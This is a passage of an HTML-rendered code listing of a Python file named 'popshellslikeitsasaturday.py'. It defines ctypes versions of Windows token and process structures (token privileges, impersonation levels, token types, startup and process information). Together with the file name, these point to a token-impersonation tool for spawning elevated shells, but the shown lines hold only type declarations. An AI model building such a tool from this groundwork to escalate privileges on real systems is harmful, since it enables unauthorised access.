        <td id="file-popshellslikeitsasaturday-py-L18" class="blob-num js-line-number" data-line-number="18"></td>
        <td id="file-popshellslikeitsasaturday-py-LC18" class="blob-code blob-code-inner js-file-line">    _fields_ <span class="pl-k">=</span> [                                               <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L19" class="blob-num js-line-number" data-line-number="19"></td>
        <td id="file-popshellslikeitsasaturday-py-LC19" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>Sid<span class="pl-pds">&#39;</span></span>,         <span class="pl-c1">PSID</span>),                          <span class="pl-c"><span class="pl-c">#</span> PSID  Sid;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L20" class="blob-num js-line-number" data-line-number="20"></td>
        <td id="file-popshellslikeitsasaturday-py-LC20" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>Attributes<span class="pl-pds">&#39;</span></span>,  <span class="pl-c1">DWORD</span>)                          <span class="pl-c"><span class="pl-c">#</span> DWORD Attributes;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L21" class="blob-num js-line-number" data-line-number="21"></td>
        <td id="file-popshellslikeitsasaturday-py-LC21" class="blob-code blob-code-inner js-file-line">               ]                                               <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L22" class="blob-num js-line-number" data-line-number="22"></td>
        <td id="file-popshellslikeitsasaturday-py-LC22" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L23" class="blob-num js-line-number" data-line-number="23"></td>
        <td id="file-popshellslikeitsasaturday-py-LC23" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L24" class="blob-num js-line-number" data-line-number="24"></td>
        <td id="file-popshellslikeitsasaturday-py-LC24" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The TOKEN_PRIVILEGES structure contains information about a set of privileges for an access token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L25" class="blob-num js-line-number" data-line-number="25"></td>
        <td id="file-popshellslikeitsasaturday-py-LC25" class="blob-code blob-code-inner js-file-line">							        <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379630(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L26" class="blob-num js-line-number" data-line-number="26"></td>
        <td id="file-popshellslikeitsasaturday-py-LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">TOKEN_PRIVILEGES</span>(<span class="pl-e">Structure</span>):      		       <span class="pl-c"><span class="pl-c">#</span> typedef struct _TOKEN_PRIVILEGES</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L27" class="blob-num js-line-number" data-line-number="27"></td>
        <td id="file-popshellslikeitsasaturday-py-LC27" class="blob-code blob-code-inner js-file-line">   _fields_ <span class="pl-k">=</span> [                                                <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L28" class="blob-num js-line-number" data-line-number="28"></td>
        <td id="file-popshellslikeitsasaturday-py-LC28" class="blob-code blob-code-inner js-file-line">    	      (<span class="pl-s"><span class="pl-pds">&#39;</span>PrivilegeCount<span class="pl-pds">&#39;</span></span>,  <span class="pl-c1">DWORD</span>),		       <span class="pl-c"><span class="pl-c">#</span> DWORD               PrivilegeCount;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L29" class="blob-num js-line-number" data-line-number="29"></td>
        <td id="file-popshellslikeitsasaturday-py-LC29" class="blob-code blob-code-inner js-file-line">              (<span class="pl-s"><span class="pl-pds">&#39;</span>Privileges<span class="pl-pds">&#39;</span></span>,      <span class="pl-c1">DWORD</span> <span class="pl-k">*</span> <span class="pl-c1">3</span>)                   <span class="pl-c"><span class="pl-c">#</span> LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L30" class="blob-num js-line-number" data-line-number="30"></td>
        <td id="file-popshellslikeitsasaturday-py-LC30" class="blob-code blob-code-inner js-file-line">              ]                                                <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L31" class="blob-num js-line-number" data-line-number="31"></td>
        <td id="file-popshellslikeitsasaturday-py-LC31" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L32" class="blob-num js-line-number" data-line-number="32"></td>
        <td id="file-popshellslikeitsasaturday-py-LC32" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The SECURITY_IMPERSONATION_LEVEL enumeration contains values that specify security impersonation levels. Security impersonation levels govern the degree to which a server process can act on behalf of a client process.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L33" class="blob-num js-line-number" data-line-number="33"></td>
        <td id="file-popshellslikeitsasaturday-py-LC33" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> or https://gist.github.com/christoph2/9c390e5c094796903097    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379572(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L34" class="blob-num js-line-number" data-line-number="34"></td>
        <td id="file-popshellslikeitsasaturday-py-LC34" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">SECURITY_IMPERSONATION_LEVEL</span>(<span class="pl-e">c_int</span>):                     <span class="pl-c"><span class="pl-c">#</span> typedef enum _SECURITY_IMPERSONATION_LEVEL {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L35" class="blob-num js-line-number" data-line-number="35"></td>
        <td id="file-popshellslikeitsasaturday-py-LC35" class="blob-code blob-code-inner js-file-line">    SecurityAnonymous       <span class="pl-k">=</span> <span class="pl-c1">0</span>                                <span class="pl-c"><span class="pl-c">#</span> SecurityAnonymous      The server process cannot obtain identification information about the client, and it cannot impersonate the client.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L36" class="blob-num js-line-number" data-line-number="36"></td>
        <td id="file-popshellslikeitsasaturday-py-LC36" class="blob-code blob-code-inner js-file-line">    SecurityIdentification  <span class="pl-k">=</span> SecurityAnonymous <span class="pl-k">+</span> <span class="pl-c1">1</span>            <span class="pl-c"><span class="pl-c">#</span> SecurityIdentification The server process can obtain information about the client, such as security identifiers and privileges, but it cannot impersonate the client.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L37" class="blob-num js-line-number" data-line-number="37"></td>
        <td id="file-popshellslikeitsasaturday-py-LC37" class="blob-code blob-code-inner js-file-line">    SecurityImpersonation   <span class="pl-k">=</span> SecurityIdentification <span class="pl-k">+</span> <span class="pl-c1">1</span>       <span class="pl-c"><span class="pl-c">#</span> SecurityImpersonation  The server process can impersonate the client&#39;s security context on its local system.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L38" class="blob-num js-line-number" data-line-number="38"></td>
        <td id="file-popshellslikeitsasaturday-py-LC38" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L39" class="blob-num js-line-number" data-line-number="39"></td>
        <td id="file-popshellslikeitsasaturday-py-LC39" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L40" class="blob-num js-line-number" data-line-number="40"></td>
        <td id="file-popshellslikeitsasaturday-py-LC40" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">c_enum</span>(<span class="pl-e">IntEnum</span>):                                          <span class="pl-c"><span class="pl-c">#</span> A ctypes-compatible IntEnum superclass that implements the class method</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L41" class="blob-num js-line-number" data-line-number="41"></td>
        <td id="file-popshellslikeitsasaturday-py-LC41" class="blob-code blob-code-inner js-file-line">    <span class="pl-en">@</span><span class="pl-c1">classmethod</span>                                               <span class="pl-c"><span class="pl-c">#</span> https://docs.python.org/3/library/functions.html#classmethod</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L42" class="blob-num js-line-number" data-line-number="42"></td>
        <td id="file-popshellslikeitsasaturday-py-LC42" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">def</span> <span class="pl-en">from_param</span>(<span class="pl-smi"><span class="pl-smi">cls</span></span>, <span class="pl-smi">obj</span>):                                  <span class="pl-c"><span class="pl-c">#</span> Define the class method `from_param`.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L43" class="blob-num js-line-number" data-line-number="43"></td>
        <td id="file-popshellslikeitsasaturday-py-LC43" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> c_int(<span class="pl-c1">cls</span>(obj))                                 <span class="pl-c"><span class="pl-c">#</span> The obj argument to the from_param method is the object instance, in this case the enumerated value itself. Any Enum with an integer value can be directly cast to int. TokenElevation -&gt; TOKEN_INFORMATION_CLASS.TokenElevation</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L44" class="blob-num js-line-number" data-line-number="44"></td>
        <td id="file-popshellslikeitsasaturday-py-LC44" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L45" class="blob-num js-line-number" data-line-number="45"></td>
        <td id="file-popshellslikeitsasaturday-py-LC45" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The TOKEN_INFORMATION_CLASS enumeration contains values that specify the type of information being assigned to or retrieved from an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L46" class="blob-num js-line-number" data-line-number="46"></td>
        <td id="file-popshellslikeitsasaturday-py-LC46" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379626(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L47" class="blob-num js-line-number" data-line-number="47"></td>
        <td id="file-popshellslikeitsasaturday-py-LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">TOKEN_INFORMATION_CLASS</span>(<span class="pl-e">c_enum</span>):                         <span class="pl-c"><span class="pl-c">#</span> typedef enum _TOKEN_INFORMATION_CLASS {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L48" class="blob-num js-line-number" data-line-number="48"></td>
        <td id="file-popshellslikeitsasaturday-py-LC48" class="blob-code blob-code-inner js-file-line">     TokenUser         <span class="pl-k">=</span> <span class="pl-c1">1</span>                                     <span class="pl-c"><span class="pl-c">#</span> TokenUser       The buffer receives a TOKEN_USER structure that contains the user account of the token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L49" class="blob-num js-line-number" data-line-number="49"></td>
        <td id="file-popshellslikeitsasaturday-py-LC49" class="blob-code blob-code-inner js-file-line">     TokenElevation    <span class="pl-k">=</span> <span class="pl-c1">20</span>                                    <span class="pl-c"><span class="pl-c">#</span> TokenElevationType The buffer receives a TOKEN_ELEVATION_TYPE value that specifies the elevation level of the token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L50" class="blob-num js-line-number" data-line-number="50"></td>
        <td id="file-popshellslikeitsasaturday-py-LC50" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L51" class="blob-num js-line-number" data-line-number="51"></td>
        <td id="file-popshellslikeitsasaturday-py-LC51" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The TOKEN_TYPE enumeration contains values that differentiate between a primary token and an impersonation token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L52" class="blob-num js-line-number" data-line-number="52"></td>
        <td id="file-popshellslikeitsasaturday-py-LC52" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379633(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L53" class="blob-num js-line-number" data-line-number="53"></td>
        <td id="file-popshellslikeitsasaturday-py-LC53" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">TOKEN_TYPE</span>(<span class="pl-e">c_enum</span>):                         	       <span class="pl-c"><span class="pl-c">#</span> typedef enum tagTOKEN_TYPE {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L54" class="blob-num js-line-number" data-line-number="54"></td>
        <td id="file-popshellslikeitsasaturday-py-LC54" class="blob-code blob-code-inner js-file-line">	TokenPrimary        <span class="pl-k">=</span> <span class="pl-c1">1</span>                                <span class="pl-c"><span class="pl-c">#</span> TokenPrimary       Indicates a primary token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L55" class="blob-num js-line-number" data-line-number="55"></td>
        <td id="file-popshellslikeitsasaturday-py-LC55" class="blob-code blob-code-inner js-file-line">	TokenImpersonation  <span class="pl-k">=</span> <span class="pl-c1">2</span>                                <span class="pl-c"><span class="pl-c">#</span> TokenImpersonation Indicates an impersonation token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L56" class="blob-num js-line-number" data-line-number="56"></td>
        <td id="file-popshellslikeitsasaturday-py-LC56" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L57" class="blob-num js-line-number" data-line-number="57"></td>
        <td id="file-popshellslikeitsasaturday-py-LC57" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L58" class="blob-num js-line-number" data-line-number="58"></td>
        <td id="file-popshellslikeitsasaturday-py-LC58" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The TOKEN_USER structure identifies the user associated with an access token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L59" class="blob-num js-line-number" data-line-number="59"></td>
        <td id="file-popshellslikeitsasaturday-py-LC59" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379634(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L60" class="blob-num js-line-number" data-line-number="60"></td>
        <td id="file-popshellslikeitsasaturday-py-LC60" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">TOKEN_USER</span>(<span class="pl-e">Structure</span>):                                   <span class="pl-c"><span class="pl-c">#</span> typedef struct _TOKEN_USER</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L61" class="blob-num js-line-number" data-line-number="61"></td>
        <td id="file-popshellslikeitsasaturday-py-LC61" class="blob-code blob-code-inner js-file-line">    _fields_ <span class="pl-k">=</span> [                                               <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L62" class="blob-num js-line-number" data-line-number="62"></td>
        <td id="file-popshellslikeitsasaturday-py-LC62" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>User<span class="pl-pds">&#39;</span></span>,    <span class="pl-c1">SID_AND_ATTRIBUTES</span>),                <span class="pl-c"><span class="pl-c">#</span> SID_AND_ATTRIBUTES User;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L63" class="blob-num js-line-number" data-line-number="63"></td>
        <td id="file-popshellslikeitsasaturday-py-LC63" class="blob-code blob-code-inner js-file-line">               ]                                               <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L64" class="blob-num js-line-number" data-line-number="64"></td>
        <td id="file-popshellslikeitsasaturday-py-LC64" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L65" class="blob-num js-line-number" data-line-number="65"></td>
        <td id="file-popshellslikeitsasaturday-py-LC65" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPVOID</span> <span class="pl-k">=</span> c_void_p</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L66" class="blob-num js-line-number" data-line-number="66"></td>
        <td id="file-popshellslikeitsasaturday-py-LC66" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPTSTR</span> <span class="pl-k">=</span> c_void_p</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L67" class="blob-num js-line-number" data-line-number="67"></td>
        <td id="file-popshellslikeitsasaturday-py-LC67" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LPBYTE</span> <span class="pl-k">=</span> c_char_p</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L68" class="blob-num js-line-number" data-line-number="68"></td>
        <td id="file-popshellslikeitsasaturday-py-LC68" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L69" class="blob-num js-line-number" data-line-number="69"></td>
        <td id="file-popshellslikeitsasaturday-py-LC69" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L70" class="blob-num js-line-number" data-line-number="70"></td>
        <td id="file-popshellslikeitsasaturday-py-LC70" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">STARTUPINFO</span>(<span class="pl-e">Structure</span>):                                  <span class="pl-c"><span class="pl-c">#</span> typedef struct _STARTUPINFO</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L71" class="blob-num js-line-number" data-line-number="71"></td>
        <td id="file-popshellslikeitsasaturday-py-LC71" class="blob-code blob-code-inner js-file-line">    _fields_ <span class="pl-k">=</span> [                                               <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L72" class="blob-num js-line-number" data-line-number="72"></td>
        <td id="file-popshellslikeitsasaturday-py-LC72" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>cb<span class="pl-pds">&#39;</span></span>,               <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  cb;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L73" class="blob-num js-line-number" data-line-number="73"></td>
        <td id="file-popshellslikeitsasaturday-py-LC73" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>lpReserved<span class="pl-pds">&#39;</span></span>,       <span class="pl-c1">LPTSTR</span>),                   <span class="pl-c"><span class="pl-c">#</span> LPTSTR lpReserved;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L74" class="blob-num js-line-number" data-line-number="74"></td>
        <td id="file-popshellslikeitsasaturday-py-LC74" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>lpDesktop<span class="pl-pds">&#39;</span></span>,        <span class="pl-c1">LPTSTR</span>),                   <span class="pl-c"><span class="pl-c">#</span> LPTSTR lpDesktop;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L75" class="blob-num js-line-number" data-line-number="75"></td>
        <td id="file-popshellslikeitsasaturday-py-LC75" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>lpTitle<span class="pl-pds">&#39;</span></span>,          <span class="pl-c1">LPTSTR</span>),                   <span class="pl-c"><span class="pl-c">#</span> LPTSTR lpTitle;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L76" class="blob-num js-line-number" data-line-number="76"></td>
        <td id="file-popshellslikeitsasaturday-py-LC76" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwX<span class="pl-pds">&#39;</span></span>,              <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwX;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L77" class="blob-num js-line-number" data-line-number="77"></td>
        <td id="file-popshellslikeitsasaturday-py-LC77" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwY<span class="pl-pds">&#39;</span></span>,              <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwY;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L78" class="blob-num js-line-number" data-line-number="78"></td>
        <td id="file-popshellslikeitsasaturday-py-LC78" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwXSize<span class="pl-pds">&#39;</span></span>,          <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwXSize;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L79" class="blob-num js-line-number" data-line-number="79"></td>
        <td id="file-popshellslikeitsasaturday-py-LC79" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwYSize<span class="pl-pds">&#39;</span></span>,          <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwYSize;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L80" class="blob-num js-line-number" data-line-number="80"></td>
        <td id="file-popshellslikeitsasaturday-py-LC80" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwXCountChars<span class="pl-pds">&#39;</span></span>,    <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwXCountChars;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L81" class="blob-num js-line-number" data-line-number="81"></td>
        <td id="file-popshellslikeitsasaturday-py-LC81" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwYCountChars<span class="pl-pds">&#39;</span></span>,    <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwYCountChars;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L82" class="blob-num js-line-number" data-line-number="82"></td>
        <td id="file-popshellslikeitsasaturday-py-LC82" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwFillAttribute<span class="pl-pds">&#39;</span></span>,  <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwFillAttribute;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L83" class="blob-num js-line-number" data-line-number="83"></td>
        <td id="file-popshellslikeitsasaturday-py-LC83" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwFlags<span class="pl-pds">&#39;</span></span>,          <span class="pl-c1">DWORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> DWORD  dwFlags;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L84" class="blob-num js-line-number" data-line-number="84"></td>
        <td id="file-popshellslikeitsasaturday-py-LC84" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>wShowWindow<span class="pl-pds">&#39;</span></span>,       <span class="pl-c1">WORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> WORD   wShowWindow;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L85" class="blob-num js-line-number" data-line-number="85"></td>
        <td id="file-popshellslikeitsasaturday-py-LC85" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>cbReserved2<span class="pl-pds">&#39;</span></span>,       <span class="pl-c1">WORD</span>),                    <span class="pl-c"><span class="pl-c">#</span> WORD   cbReserved2;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L86" class="blob-num js-line-number" data-line-number="86"></td>
        <td id="file-popshellslikeitsasaturday-py-LC86" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>lpReserved2<span class="pl-pds">&#39;</span></span>,     <span class="pl-c1">LPBYTE</span>),                    <span class="pl-c"><span class="pl-c">#</span> LPBYTE lpReserved2;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L87" class="blob-num js-line-number" data-line-number="87"></td>
        <td id="file-popshellslikeitsasaturday-py-LC87" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>hStdInput<span class="pl-pds">&#39;</span></span>,       <span class="pl-c1">HANDLE</span>),                    <span class="pl-c"><span class="pl-c">#</span> HANDLE hStdInput;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L88" class="blob-num js-line-number" data-line-number="88"></td>
        <td id="file-popshellslikeitsasaturday-py-LC88" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>hStdOutput<span class="pl-pds">&#39;</span></span>,      <span class="pl-c1">HANDLE</span>),                    <span class="pl-c"><span class="pl-c">#</span> HANDLE hStdOutput;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L89" class="blob-num js-line-number" data-line-number="89"></td>
        <td id="file-popshellslikeitsasaturday-py-LC89" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>hStdError<span class="pl-pds">&#39;</span></span>,       <span class="pl-c1">HANDLE</span>)                     <span class="pl-c"><span class="pl-c">#</span> HANDLE hStdError;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L90" class="blob-num js-line-number" data-line-number="90"></td>
        <td id="file-popshellslikeitsasaturday-py-LC90" class="blob-code blob-code-inner js-file-line">               ]                                               <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L91" class="blob-num js-line-number" data-line-number="91"></td>
        <td id="file-popshellslikeitsasaturday-py-LC91" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L92" class="blob-num js-line-number" data-line-number="92"></td>
        <td id="file-popshellslikeitsasaturday-py-LC92" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L93" class="blob-num js-line-number" data-line-number="93"></td>
        <td id="file-popshellslikeitsasaturday-py-LC93" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Contains information about a newly created process and its primary thread. It is used with the CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, or CreateProcessWithTokenW function.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L94" class="blob-num js-line-number" data-line-number="94"></td>
        <td id="file-popshellslikeitsasaturday-py-LC94" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L95" class="blob-num js-line-number" data-line-number="95"></td>
        <td id="file-popshellslikeitsasaturday-py-LC95" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">PROCESS_INFORMATION</span>(<span class="pl-e">Structure</span>):                          <span class="pl-c"><span class="pl-c">#</span> typedef struct _PROCESS_INFORMATION</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L96" class="blob-num js-line-number" data-line-number="96"></td>
        <td id="file-popshellslikeitsasaturday-py-LC96" class="blob-code blob-code-inner js-file-line">    _fields_ <span class="pl-k">=</span> [                                               <span class="pl-c"><span class="pl-c">#</span> {</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L97" class="blob-num js-line-number" data-line-number="97"></td>
        <td id="file-popshellslikeitsasaturday-py-LC97" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>hProcess<span class="pl-pds">&#39;</span></span>,    <span class="pl-c1">HANDLE</span>),                        <span class="pl-c"><span class="pl-c">#</span> HANDLE hProcess;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L98" class="blob-num js-line-number" data-line-number="98"></td>
